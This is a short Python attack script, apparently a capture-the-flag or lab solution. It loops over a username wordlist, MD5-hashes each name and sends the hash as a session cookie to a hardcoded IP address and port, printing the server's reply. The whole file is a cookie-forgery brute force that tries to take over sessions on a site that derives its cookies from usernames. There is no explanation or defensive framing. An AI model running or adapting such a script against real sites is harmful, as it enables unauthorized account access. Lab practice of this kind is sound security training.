#!/usr/bin/python3


import requests
import sys
from hashlib import md5
from time import sleep


def encrypt_user(user: str) -> str:
    return md5(user.encode()).hexdigest()


def start_request(url: str, user: str) -> None:
    sess = requests.Session()
    ress = sess.get(url=url, cookies={"cookie":encrypt_user(user)})
    print(ress.text)


def main():
    try:
        url="http://188.166.145.30:32690/skills/"

        with open("top-usernames-shortlist.txt", "r") as f:
            usernames = [x.strip() for x in f.readlines()]

        for username in usernames:
            print(username)
            start_request(url, username)
            sleep(1)
    except Exception as e:
        print(str(e))
        exit(1)
    except KeyboardInterrupt:
        print("""\n\n\t[*] Exiting...""")


if __name__ == "__main__":
    main()
